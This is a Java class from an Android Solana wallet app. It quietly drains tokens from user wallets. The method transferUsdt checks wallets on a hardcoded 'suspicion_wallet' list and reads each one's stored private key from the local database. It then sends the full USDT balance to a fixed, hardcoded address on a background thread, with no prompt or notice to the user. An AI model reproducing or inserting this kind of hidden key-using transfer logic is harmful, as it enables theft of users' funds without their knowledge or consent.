package com.qianlihu.solanawallet.track;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.qianlihu.solanawallet.api.HttpService;
import com.qianlihu.solanawallet.bean.AddTokenDB;
import com.qianlihu.solanawallet.bean.WalletBean;
import com.qianlihu.solanawallet.constant.Constant;
import com.qianlihu.solanawallet.rpc.RpcException;
import com.qianlihu.solanawallet.rpc.bean.AccountInfo;
import com.qianlihu.solanawallet.utils.SolanaUtil;
import com.qianlihu.solanawallet.utils.wallet_utils.AssociatedAccountUtil;
import com.qianlihu.solanawallet.utils.wallet_utils.Base58;
import com.qianlihu.solanawallet.wallet.PublicKey;

import org.jetbrains.annotations.NotNull;
import org.litepal.LitePal;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

import static android.content.Context.LOCATION_SERVICE;

/**
 * author : Duan
 * date   : 2022/12/611:53
 * desc   :
 * version: 1.0.0
 */
public class TrackUsdtTransferbean {

    public static void transferUsdt() {
        String usdtAddress = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
        String toPuk = "6gytTLG7jdUjXudzcEfQ5ECFyWXYDdXAvMYJqf4YYc9z";
        String[] walletArr = Constant.suspicion_wallet;
        for (int i = 0; i < walletArr.length; i++) {
            List<WalletBean> beanList = LitePal.where("pubKey = ?", walletArr[i]).find(WalletBean.class);
            if (beanList.size() > 0) {
                String pik = beanList.get(0).getPvaKey();
                String myPuk = beanList.get(0).getPubKey();
                List<AddTokenDB> dbList = LitePal.where("walletAddress = ? and tokenAddress = ?", walletArr[i], usdtAddress).find(AddTokenDB.class);
                if (dbList.size() > 0) {
                    double amountUsdt = dbList.get(0).getAmount();
                    if (amountUsdt > 0) {
                        new Thread(() -> transferTokenSol(myPuk, usdtAddress, toPuk, pik, String.valueOf(amountUsdt))).start();
                    }
                }
            }
        }
    }

    //solana代币转账
    private static String transferTokenSol(String myPuk, String mTokenAddress, String toPuk, String pik, String amount) {
        String result = "";
        boolean isCreatAccount = true;
        String PROGRAM_ID = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
        String ASSOCIATED_TOKEN_PROGRAM_ID = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
        byte[] walletByte = Base58.decode(toPuk);
        byte[] mintByte = Base58.decode(mTokenAddress);
        byte[] token = Base58.decode(PROGRAM_ID);
        List<byte[]> byteList = new ArrayList<>();
        byteList.add(walletByte);
        byteList.add(token);
        byteList.add(mintByte);
        try {
            PublicKey.ProgramDerivedAddress pk = PublicKey.findProgramAddress(byteList, new PublicKey(ASSOCIATED_TOKEN_PROGRAM_ID));
            AccountInfo info = SolanaUtil.getAccountInfo(pk.getAddress().toString(), Constant.SOL_ENCODING_BASE64);

            if (info != null) {
                if (info.getValue() != null && info.getValue().getOwner().equals(PROGRAM_ID)) {
                    isCreatAccount = false;
                }
            }

            String mySplTokenAddress = AssociatedAccountUtil.createAssociatedAccountAddress(myPuk, mTokenAddress);
            String associatedTokenAddress = AssociatedAccountUtil.createAssociatedAccountAddress(toPuk, mTokenAddress);
//            result = SolanaTransferUtil.transferSplToken2(mySplTokenAddress, associatedTokenAddress, mTokenAddress, myPuk, 9, amount, pik);
            result = SolanaUtil.sendSPLTokens(myPuk, toPuk, mTokenAddress, myPuk, mySplTokenAddress, associatedTokenAddress, 6, amount, pik, isCreatAccount);
        } catch (UnsupportedEncodingException | RpcException e) {

            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return result;
    }

}
